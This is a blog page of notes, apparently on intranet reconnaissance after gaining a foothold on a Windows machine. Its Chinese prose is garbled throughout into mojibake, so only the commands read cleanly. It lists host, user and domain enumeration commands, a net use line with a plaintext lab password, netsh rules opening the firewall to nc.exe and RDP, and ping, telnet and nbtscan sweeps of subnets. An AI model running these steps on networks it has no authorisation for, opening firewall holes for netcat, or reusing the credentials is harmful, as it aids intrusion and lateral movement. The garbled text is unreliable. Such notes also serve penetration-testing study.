

<!DOCTYPE html>
<html lang="en" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="https://raw.githubusercontent.com/kIl3rr/photo/main/icon.jpg">
  <link rel="icon" href="https://raw.githubusercontent.com/kIl3rr/photo/main/icon.jpg">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="">
  <meta name="author" content="John Doe">
  <meta name="keywords" content="">
  <meta name="description" content="WIN‰∏âÈóÆÔºöÊàëÊòØË∞ÅÔºüËøôÊòØÂì™ÔºüÊàëÂú®Âì™ÔºüÂç≥Âà§Êñ≠ÂΩìÂâçÊú∫Âô®ÔºåÂΩìÂâçÊú∫Âô®ÊâÄÂ§ÑÁöÑÁΩëÁªúÁéØÂ¢É(ÊãìÊâëÁªìÊûÑÂàÜÊûê)ÔºåÂΩìÂâçÊú∫Âô®ÊâÄÂ§ÑÁöÑÂå∫Âüü ÊàëÊòØË∞ÅÔºöÂàÜÊûêÂΩìÂâçÊú∫Âô®ÁöÑËßíËâ≤Ôºåweb ÊúçÂä°Âô®„ÄÅÂºÄÂèëÊµãËØïÊúçÂä°Âô®„ÄÅÊñá‰ª∂ÊúçÂä°Âô®„ÄÅ‰ª£ÁêÜÊúçÂä°Âô®„ÄÅDNS ÊúçÂä°Âô®Á≠âÁ≠â ËøôÊòØÂì™ÔºöÊï¥‰∏™ÂÜÖÁΩëÁªìÊûÑÁöÑÂàÜÊûê ÊàëÂú®Âì™ÔºöDMZ„ÄÅÂäûÂÖ¨Âå∫„ÄÅÊ†∏ÂøÉÂå∫ÔºõÊàñËÄÖÂú®ÂÖ∂‰ªñÂå∫Âüü Êî∂ÈõÜÊú¨Êú∫‰ø°ÊÅØ1. ÊâãÂä®Êî∂ÈõÜ ÁΩëÁªúÈÖçÁΩÆ   ipconfig &#x2F;all   Á≥ªÁªü‰ø°ÊÅØ   systeminfo">
<meta property="og:type" content="article">
<meta property="og:title" content="ÂÜÖÁΩë‰ø°ÊÅØÊî∂ÈõÜ">
<meta property="og:url" content="http://example.com/2022/01/03/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/index.html">
<meta property="og:site_name" content="üóÑ">
<meta property="og:description" content="WIN‰∏âÈóÆÔºöÊàëÊòØË∞ÅÔºüËøôÊòØÂì™ÔºüÊàëÂú®Âì™ÔºüÂç≥Âà§Êñ≠ÂΩìÂâçÊú∫Âô®ÔºåÂΩìÂâçÊú∫Âô®ÊâÄÂ§ÑÁöÑÁΩëÁªúÁéØÂ¢É(ÊãìÊâëÁªìÊûÑÂàÜÊûê)ÔºåÂΩìÂâçÊú∫Âô®ÊâÄÂ§ÑÁöÑÂå∫Âüü ÊàëÊòØË∞ÅÔºöÂàÜÊûêÂΩìÂâçÊú∫Âô®ÁöÑËßíËâ≤Ôºåweb ÊúçÂä°Âô®„ÄÅÂºÄÂèëÊµãËØïÊúçÂä°Âô®„ÄÅÊñá‰ª∂ÊúçÂä°Âô®„ÄÅ‰ª£ÁêÜÊúçÂä°Âô®„ÄÅDNS ÊúçÂä°Âô®Á≠âÁ≠â ËøôÊòØÂì™ÔºöÊï¥‰∏™ÂÜÖÁΩëÁªìÊûÑÁöÑÂàÜÊûê ÊàëÂú®Âì™ÔºöDMZ„ÄÅÂäûÂÖ¨Âå∫„ÄÅÊ†∏ÂøÉÂå∫ÔºõÊàñËÄÖÂú®ÂÖ∂‰ªñÂå∫Âüü Êî∂ÈõÜÊú¨Êú∫‰ø°ÊÅØ1. ÊâãÂä®Êî∂ÈõÜ ÁΩëÁªúÈÖçÁΩÆ   ipconfig &#x2F;all   Á≥ªÁªü‰ø°ÊÅØ   systeminfo">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220211173305284.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220211220047347.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220211220109319.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220218163656131.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220218164732019.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220218164932211.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220218164955920.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220218165731711.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220218170123641.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220218171143257.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220218170622671.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220218171230372.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220218170819135.png">
<meta property="article:published_time" content="2022-01-03T13:03:06.876Z">
<meta property="article:modified_time" content="2022-04-15T05:55:21.646Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="knowledge">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220211173305284.png">
  
  <title>ÂÜÖÁΩë‰ø°ÊÅØÊî∂ÈõÜ - üóÑ</title>

  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-dark-dimmed.min.css" />
    
  

  
    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
  


<!-- ‰∏ªÈ¢ò‰æùËµñÁöÑÂõæÊ†áÂ∫ìÔºå‰∏çË¶ÅËá™Ë°å‰øÆÊîπ -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- Ëá™ÂÆö‰πâÊ†∑Âºè‰øùÊåÅÂú®ÊúÄÂ∫ïÈÉ® -->

  
<link rel="stylesheet" href="/css/macpanel.css">



  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.12","typing":{"enable":true,"typeSpeed":90,"cursorChar":"_","loop":true},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":"G-SL9T1KRBQY","gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 6.0.0"></head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>üë©‚Äçüíª</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                Home
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                Archives
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                Categories
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                Tags
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                About
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/">
                <i class="iconfont icon-link-fill"></i>
                Links
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner" id="banner" parallax=true
         style="background: url('https://raw.githubusercontent.com/kIl3rr/photo/main/post.jpg') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="page-header text-center fade-in-up">
            <span class="h2" id="subtitle" title="ÂÜÖÁΩë‰ø°ÊÅØÊî∂ÈõÜ">
              
            </span>

            
              <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2022-01-03 21:03" pubdate>
        January 3, 2022 pm
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      49k Â≠ó
    </span>
  

  
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      NaN ÂàÜÈíü
    </span>
  

  
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">ÂÜÖÁΩë‰ø°ÊÅØÊî∂ÈõÜ</h1>
            
            <div class="markdown-body">
              <h1 id="WIN"><a href="#WIN" class="headerlink" title="WIN"></a>WIN</h1><p>‰∏âÈóÆÔºöÊàëÊòØË∞ÅÔºüËøôÊòØÂì™ÔºüÊàëÂú®Âì™ÔºüÂç≥Âà§Êñ≠ÂΩìÂâçÊú∫Âô®ÔºåÂΩìÂâçÊú∫Âô®ÊâÄÂ§ÑÁöÑÁΩëÁªúÁéØÂ¢É(ÊãìÊâëÁªìÊûÑÂàÜÊûê)ÔºåÂΩìÂâçÊú∫Âô®ÊâÄÂ§ÑÁöÑÂå∫Âüü</p>
<p>ÊàëÊòØË∞ÅÔºöÂàÜÊûêÂΩìÂâçÊú∫Âô®ÁöÑËßíËâ≤Ôºåweb ÊúçÂä°Âô®„ÄÅÂºÄÂèëÊµãËØïÊúçÂä°Âô®„ÄÅÊñá‰ª∂ÊúçÂä°Âô®„ÄÅ‰ª£ÁêÜÊúçÂä°Âô®„ÄÅDNS ÊúçÂä°Âô®Á≠âÁ≠â</p>
<p>ËøôÊòØÂì™ÔºöÊï¥‰∏™ÂÜÖÁΩëÁªìÊûÑÁöÑÂàÜÊûê</p>
<p>ÊàëÂú®Âì™ÔºöDMZ„ÄÅÂäûÂÖ¨Âå∫„ÄÅÊ†∏ÂøÉÂå∫ÔºõÊàñËÄÖÂú®ÂÖ∂‰ªñÂå∫Âüü</p>
<h2 id="Êî∂ÈõÜÊú¨Êú∫‰ø°ÊÅØ"><a href="#Êî∂ÈõÜÊú¨Êú∫‰ø°ÊÅØ" class="headerlink" title="Êî∂ÈõÜÊú¨Êú∫‰ø°ÊÅØ"></a>Êî∂ÈõÜÊú¨Êú∫‰ø°ÊÅØ</h2><h3 id="1-ÊâãÂä®Êî∂ÈõÜ"><a href="#1-ÊâãÂä®Êî∂ÈõÜ" class="headerlink" title="1. ÊâãÂä®Êî∂ÈõÜ"></a>1. ÊâãÂä®Êî∂ÈõÜ</h3><ul>
<li>ÁΩëÁªúÈÖçÁΩÆ</li>
</ul>
<blockquote>
<p><strong>ipconfig /all</strong></p>
</blockquote>
<ul>
<li>Á≥ªÁªü‰ø°ÊÅØ</li>
</ul>
<blockquote>
<p><strong>systeminfo</strong></p>
<p>ÊèêÊùÉÔºö<a target="_blank" rel="noopener" href="https://i.hacking8.com/tiquan/">https://i.hacking8.com/tiquan/</a></p>
<p>Âú®ÂàùÊ≠•Ëé∑ÂæóÁöÑ shell ÂõûÊòæ‰∏çË∂≥Êó∂ÔºåÂèØ‰ª•ÈÖçÂêàÈÄöÈÖçÁ¨¶ÂíåÂëΩ‰ª§ findstr</p>
<p>Êü•ÁúãÁ≥ªÁªüÊû∂ÊûÑ</p>
<p><strong>echo %PROCESSOR_ARCHITECTURE%</strong></p>
<p>Ëøô‰∏™ÂëΩ‰ª§Âà§Êñ≠Êìç‰ΩúÁ≥ªÁªü‰ΩçÊï∞ÊòØ‰∏çÂáÜÁ°ÆÁöÑÔºåÂèñÂÜ≥‰∫é shell ÂΩìÂâçÁöÑ CMD ‰ΩçÊï∞</p>
</blockquote>
<ul>
<li>Êü•ÁúãÂÆâË£ÖËΩØ‰ª∂‰ø°ÊÅØ</li>
</ul>
<blockquote>
<p><strong>wmic product get name,version</strong></p>
<p>Âú®ËöÅÂâëÊãøÂà∞ÁöÑ webshell Ê≤°ÊúâÊ≠§ÂëΩ‰ª§ÁöÑÂõûÊòæÔºåÂèØ‰ª•&gt; 1.txt Âêé type„ÄÅmore ÊâìÂºÄ</p>
<p><strong>powershell ‚ÄúGet-WmiObject -class Win32_Product|Select-Object -Property name,version‚Äú</strong></p>
</blockquote>
<ul>
<li>Êü•ÁúãÊúçÂä°</li>
</ul>
<blockquote>
<p><strong>wmic service list brief</strong></p>
</blockquote>
<ul>
<li>Êü•ÁúãËøõÁ®ã</li>
</ul>
<blockquote>
<p><strong>tasklist</strong></p>
<p><strong>wmic process list brief</strong></p>
<p>Âê´Âè•ÊüÑÊï∞„ÄÅËøõÁ®ã‰ºòÂÖàÁ∫ß„ÄÅËøõÁ®ã id„ÄÅÁ∫øÁ®ãÊï∞„ÄÅÂÜÖÂ≠ò‰ΩøÁî®Á≠â</p>
</blockquote>
<ul>
<li>Êü•ÁúãÂêØÂä®Á®ãÂ∫è</li>
</ul>
<blockquote>
<p><strong>wmic startup get caption,command</strong></p>
</blockquote>
<ul>
<li>Êü•ÁúãËÆ°Âàí‰ªªÂä°</li>
</ul>
<blockquote>
<p><strong>schtasks /query</strong></p>
<p>Êõ¥ÂÖ∑‰ΩìÁöÑÁî®Ê≥ïÔºöschtasks /query /?</p>
<p>Â¶ÇÈÅáÊä•ÈîôÔºå<strong>chcp 437</strong>Âç≥ÂèØ</p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220211173305284.png" srcset="/img/loading.gif" lazyload></p>
</blockquote>
<ul>
<li>Êü•Áúã‰∏ªÊú∫ÁªüËÆ°Êï∞ÊçÆ</li>
</ul>
<blockquote>
<p><strong>net statistic workstation</strong></p>
</blockquote>
<ul>
<li>Êü•ËØ¢Áî®Êà∑„ÄÅÁªÑ</li>
</ul>
<blockquote>
<p>net user</p>
<p><strong>query user || qwinsta</strong> Êü•ÁúãÂú®Á∫øÁî®Êà∑</p>
<p>net localgroup</p>
</blockquote>
<ul>
<li>ÂàóÂá∫ÊàñÊñ≠ÂºÄÊú¨Âú∞ËÆ°ÁÆóÊú∫‰∏éÊâÄËøûÊé•ÁöÑÂÆ¢Êà∑Á´Ø‰πãÈó¥ÁöÑ‰ºöËØù</li>
</ul>
<blockquote>
<p>ÂÆ¢Êà∑Á´Ø net use \stu1.god.org hongrisec@2019 /u:administrator</p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220211220047347.png" srcset="/img/loading.gif" lazyload></p>
<p>Ê≥®ÊÑèË¢´ËøûÊé•ÁöÑËÆ°ÁÆóÊú∫ÂèØËÉΩÈúÄË¶ÅÂÖ≥Èó≠ÂüüÈò≤ÁÅ´Â¢ôÔºåÂ¶ÇÊûú‰∏çË°åËØ∑ÊéíÊü•ÂØπÂ∫îÊúçÂä°</p>
<p><strong>net session</strong></p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220211220109319.png" srcset="/img/loading.gif" lazyload></p>
</blockquote>
<ul>
<li>ÁΩëÁªúËøûÊé•</li>
</ul>
<blockquote>
<p><strong>netstat -a</strong></p>
</blockquote>
<ul>
<li>Ë°•‰∏Å‰ø°ÊÅØ</li>
</ul>
<p>Âú®Á≥ªÁªü‰ø°ÊÅØÈáåÈù¢ÂèØ‰ª•ÁúãÂà∞Ôºå‰πüÂèØ‰ª•</p>
<blockquote>
<p><strong>wmic qfe get caption,description,hotfixid,installedon</strong></p>
</blockquote>
<ul>
<li>ÂÖ±‰∫´‰ø°ÊÅØ</li>
</ul>
<blockquote>
<p>net share</p>
<p>wmic share get name,path,status</p>
</blockquote>
<ul>
<li>Êü•ËØ¢Ë∑ØÁî±Ë°®</li>
</ul>
<blockquote>
<p><strong>arp -a</strong></p>
<p><strong>route print</strong></p>
</blockquote>
<ul>
<li>Èò≤ÁÅ´Â¢ô</li>
</ul>
<blockquote>
<ol>
<li>&lt;=winServer2003 Ôºö</li>
</ol>
<p>netsh firewall</p>
<p>e.g.Ôºönetsh firewall add allowedprogram c:\nc.exe ‚Äúnc‚Äù enable</p>
<ol start="2">
<li>&gt;winServer2003Ôºö</li>
</ol>
<p>netsh advfirewall</p>
<p>e.g.Ôºönetsh advfirewall firewall add rule name=‚Äùnc‚Äù dir=in(ÂÖ•Á´ô) action=allow program=‚Äùc:\nc.exe‚Äù</p>
<p>ÂÖÅËÆ∏Á®ãÂ∫èÁöÑÂÖ∑‰ΩìÊüê‰∏™Á´ØÂè£„ÄÅÂçèËÆÆÂÖ•Á´ôÔºö</p>
<p>netsh advfirewall firewall add rule name=‚ÄùRD‚Äù protocol=TCP dir=in localport=3389 action=allow</p>
</blockquote>
<h3 id="2-Ëá™Âä®Êî∂ÈõÜ"><a href="#2-Ëá™Âä®Êî∂ÈõÜ" class="headerlink" title="2. Ëá™Âä®Êî∂ÈõÜ"></a>2. Ëá™Âä®Êî∂ÈõÜ</h3><p><a target="_blank" rel="noopener" href="http://www.fuzzysecurity.com/scripts/files/wmic_info.rar">http://www.fuzzysecurity.com/scripts/files/wmic_info.rar</a></p>
<p>‰∏Ä‰∏™Âü∫‰∫é wmic ÁöÑ bat ËÑöÊú¨</p>
<h2 id="Êü•ËØ¢ÂΩìÂâçÊùÉÈôê"><a href="#Êü•ËØ¢ÂΩìÂâçÊùÉÈôê" class="headerlink" title="Êü•ËØ¢ÂΩìÂâçÊùÉÈôê"></a>Êü•ËØ¢ÂΩìÂâçÊùÉÈôê</h2><ol>
<li>Êü•ÁúãÂΩìÂâçÊùÉÈôê</li>
</ol>
<ul>
<li>Êú¨Âú∞ÊôÆÈÄöÁî®Êà∑</li>
<li>Êú¨Âú∞ÁÆ°ÁêÜÂëòÁî®Êà∑</li>
<li>ÂüüÂÜÖÁî®Êà∑</li>
</ul>
<blockquote>
<p><strong>whoami</strong></p>
<p>Ëé∑ÂèñÂüü SID</p>
<p><strong>whoami /all</strong></p>
</blockquote>
<ol start="2">
<li>Êü•ËØ¢Áî®Êà∑(ÂåÖÂê´Âú®ÂüüÁßç)ÁöÑËØ¶ÁªÜ‰ø°ÊÅØ</li>
</ol>
<blockquote>
<p><strong>net user xxx /domain</strong></p>
</blockquote>
<p>Â¶Ç‰ΩïÂú®ÂüüÊéß‰∏≠ÂßîÊ¥æ‚Äú‚ÄùÂüüË¥¶Âè∑ÊùÉÈôê‚ÄúÔºü</p>
<p>È™åËØÅ‚ÄùÂüüË¥¶Âè∑ÁôªÂΩïÂÖ∂‰ªñÊú∫Âô®‚Äú</p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220218163656131.png" srcset="/img/loading.gif" lazyload alt="image-20220218163656131"></p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220218164732019.png" srcset="/img/loading.gif" lazyload alt="image-20220218164732019"></p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220218164932211.png" srcset="/img/loading.gif" lazyload alt="image-20220218164932211"><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220218164955920.png" srcset="/img/loading.gif" lazyload alt="image-20220218164955920"></p>
<h2 id="Âà§Êñ≠ÊòØÂê¶Â≠òÂú®Âüü"><a href="#Âà§Êñ≠ÊòØÂê¶Â≠òÂú®Âüü" class="headerlink" title="Âà§Êñ≠ÊòØÂê¶Â≠òÂú®Âüü"></a>Âà§Êñ≠ÊòØÂê¶Â≠òÂú®Âüü</h2><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220218165731711.png" srcset="/img/loading.gif" lazyload alt="image-20220218165731711"></p>
<blockquote>
<p><strong>nslookup Âüü DNS ÂêéÁºÄ</strong></p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220218170123641.png" srcset="/img/loading.gif" lazyload alt="image-20220218170123641"></p>
<ul>
<li>Êü•ËØ¢ÂΩìÂâçÁôªÂΩïÂüüÂèäÁôªÂΩïÁî®Êà∑‰ø°ÊÅØ</li>
</ul>
<blockquote>
<p><strong>net config workstation</strong></p>
</blockquote>
<ul>
<li>Âà§Êñ≠‰∏ªÂüü</li>
</ul>
<blockquote>
<p><strong>net time /domain</strong></p>
</blockquote>
<p>‰ºöÊúâ‰∏âÁßçÊÉÖÂÜµÔºö</p>
<ol>
<li>Â≠òÂú®ÂüüÔºå‰ΩÜÂΩìÂâçÁî®Êà∑‰∏çÊòØÂüüÁî®Êà∑</li>
</ol>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220218171143257.png" srcset="/img/loading.gif" lazyload></p>
<ol start="2">
<li>‰∏çÂ≠òÂú®ÂüüÔºåÂΩìÂâçÁΩëÁªúÁéØÂ¢É‰∏∫Â∑•‰ΩúÁªÑ</li>
</ol>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220218170622671.png" srcset="/img/loading.gif" lazyload alt="image-20220218170622671"></p>
<ol start="3">
<li>Â≠òÂú®ÂüüÔºå‰∏îÂΩìÂâçÁî®Êà∑ÁôªÂΩïÂà∞Âüü‰∏≠</li>
</ol>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220218171230372.png" srcset="/img/loading.gif" lazyload alt="image-20220218171230372"></p>
<blockquote>
<p>Âú®ÂüüÁî®Êà∑ÂàáÊç¢Ëá≥Êú¨Âú∞Áî®Êà∑ <strong>ËÆ°ÁÆóÊú∫Âêç\Êú¨Âú∞Áî®Êà∑</strong></p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220218170819135.png" srcset="/img/loading.gif" lazyload alt="image-20220218170819135"></p>
</blockquote>
<h2 id="Êé¢ÊµãÂüüÂÜÖÂ≠òÊ¥ª‰∏ªÊú∫"><a href="#Êé¢ÊµãÂüüÂÜÖÂ≠òÊ¥ª‰∏ªÊú∫" class="headerlink" title="Êé¢ÊµãÂüüÂÜÖÂ≠òÊ¥ª‰∏ªÊú∫"></a>Êé¢ÊµãÂüüÂÜÖÂ≠òÊ¥ª‰∏ªÊú∫</h2><h3 id="NetBIOS"><a href="#NetBIOS" class="headerlink" title="NetBIOS"></a>NetBIOS</h3><blockquote>
<p><strong>NetBIOS</strong>Ôºå‰∏∫<strong>ÁΩë‰∏äÂü∫Êú¨ËæìÂÖ•ËæìÂá∫Á≥ªÁªü</strong>ÔºàËã±ËØ≠ÔºöNetwork Basic Input/Output SystemÔºâÁöÑÁº©ÂÜôÔºåÂÆÉÊèê‰æõ‰∫Ü<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/OSI%E6%A8%A1%E5%9E%8B">OSI Ê®°Âûã</a>‰∏≠ÁöÑ<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E4%BC%9A%E8%AF%9D%E5%B1%82">‰ºöËØùÂ±Ç</a>ÊúçÂä°ÔºåËÆ©Âú®‰∏çÂêåËÆ°ÁÆóÊú∫‰∏äËøêË°åÁöÑ‰∏çÂêå<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E7%A8%8B%E5%BA%8F/13831935">Á®ãÂ∫è</a>ÔºåÂèØ‰ª•Âú®<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%B1%80%E5%9F%9F%E7%BD%91">Â±ÄÂüüÁΩë</a>‰∏≠Ôºå‰∫íÁõ∏ËøûÁ∫øÔºå‰ª•ÂèäÂàÜ‰∫´Êï∞ÊçÆ„ÄÇ‰∏•Ê†ºÊù•ËØ¥ÔºåNetBIOS ‰∏çÊòØ‰∏ÄÁßçÁΩë‰∏äÂçèËÆÆÔºåËÄåÊòØ<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8E%A5%E5%8F%A3">Â∫îÁî®Á®ãÂ∫èÊé•Âè£</a>ÔºàAPIÔºâ„ÄÇËæÉÂè§ËÄÅÁöÑ<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/192">Êìç‰ΩúÁ≥ªÁªü</a>Ôºå‰ΩøÁî®[IEEE 802.2](<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/IEEE">https://baike.baidu.com/item/IEEE</a> 802.2)‰∏é<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/IPX%2FSPX">IPX/SPX</a>ÂçèËÆÆÔºåÂèØ‰ª•‰ΩøÁî® NetBIOS Frames ÂçèËÆÆÊàñ NetBIOS over <a target="_blank" rel="noopener" href="https://baike.baidu.com/item/IPX%2FSPX%E5%8D%8F%E8%AE%AE/659271">IPX/SPX ÂçèËÆÆ</a>Êù•Ëøê‰Ωú„ÄÇÁé∞‰ª£Êìç‰ΩúÁ≥ªÁªüÔºåÂ§öÊï∞ÈÉΩ‰ΩøÁî®<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/TCP%2FIP%E5%8D%8F%E8%AE%AE/212915">TCP/IP ÂçèËÆÆ</a>ÔºåÂàôÂèØÈÄèËøá NetBIOS over TCP/IP ÂçèËÆÆÊù•Áõ∏‰∫íÈÄö‰ø°</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="http://www.unixwiz.net/tools/nbtscan.html">nbtscan</a></p>
<p>nbtscan Êúâ Windows Âíå Linux ‰∏§‰∏™ÁâàÊú¨Ôºå‰ΩøÁî® netbios ÂçèËÆÆÊâ´ÊèèÊú¨Âú∞ÊàñËøúÁ®ã TCP/IP ÁΩëÁªú‰∏äÁöÑÂºÄÊîæ NetBIOS ÂêçÁß∞ÊúçÂä°Âô®„ÄÇ</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">nbtscan.exe 192.168.7.0/24<br>192.168.7.1     \DP<br>192.168.7.7     TEAMSSIX\DC                     SHARING DC<br>192.168.7.107   TEAMSSIX\DANIEL7                SHARING<br>*timeout (normal end of scan)<br></code></pre></td></tr></table></figure>

<h3 id="ICMP"><a href="#ICMP" class="headerlink" title="ICMP"></a>ICMP</h3><blockquote>
<p>for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.1.%I |findstr ‚ÄúTTL‚Äù time to live</p>
<p>for k in $( seq 1 255);do ping -c 1 192.168.7.$k|grep ‚Äúttl‚Äù|awk -F ‚Äú[ :]+‚Äù ‚Äò{print $4}‚Äô; done //linux</p>
</blockquote>
<h3 id="Telnet"><a href="#Telnet" class="headerlink" title="Telnet"></a>Telnet</h3><blockquote>
<p>for /l %a in (1,1,254) do start /min /low telnet 192.168.7.%a 445</p>
</blockquote>
<h3 id="TCPing"><a href="#TCPing" class="headerlink" title="TCPing"></a>TCPing</h3><p><a target="_blank" rel="noopener" href="https://elifulkerson.com/projects/tcping.php">TCPing</a></p>
